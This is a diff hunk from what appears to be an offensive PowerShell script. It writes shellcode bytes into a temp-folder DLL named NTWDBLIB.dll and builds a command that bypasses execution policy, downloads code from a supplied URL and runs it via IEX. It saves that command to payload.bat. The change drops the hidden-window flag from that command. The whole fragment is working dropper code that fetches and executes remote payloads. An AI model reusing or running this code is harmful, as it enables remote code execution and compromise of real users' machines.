@@ -2926,7 +2926,7 @@ Param(
 add-content -value $sc64 -encoding byte -path $env:temp\NTWDBLIB.dll
 
 
-$powercommand= "powershell.exe -windowstyle hidden -Exec ByPass IEX (new-object Net.WebClient).DownloadString('$url');$command"
+$powercommand= "powershell.exe -Exec ByPass IEX (new-object Net.WebClient).DownloadString('$url');$command"
 
 $powercommand | OUT-file -encoding default -file $env:temp\payload.bat
 #$Spayload= "start /b %temp%\pay.bat" | OUT-file -encoding default -file $env:temp\payload.bat
